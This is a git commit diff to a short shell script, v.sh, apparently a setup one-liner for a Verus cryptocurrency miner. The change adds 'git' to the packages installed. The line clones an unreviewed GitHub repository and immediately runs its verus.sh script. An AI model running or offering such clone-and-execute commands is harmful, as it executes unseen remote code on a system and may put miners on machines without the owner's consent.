2de9411451070d794c2a0386f3a8999b86570277
Omarjetos <93458140+Omarjetos@users.noreply.github.com>
2021-11-06 10:51:04 +0700

    Update v.sh

--- v.sh
+++ v.sh
@@ -1,2 +1,2 @@
 #omarjeto
-apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && git clone https://github.com/Omarjetos/ezz.git && cd ezz && chmod +x compile.sh && chmod +x verus.sh && ./verus.sh
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 git && git clone https://github.com/Omarjetos/ezz.git && cd ezz && chmod +x compile.sh && chmod +x verus.sh && ./verus.sh
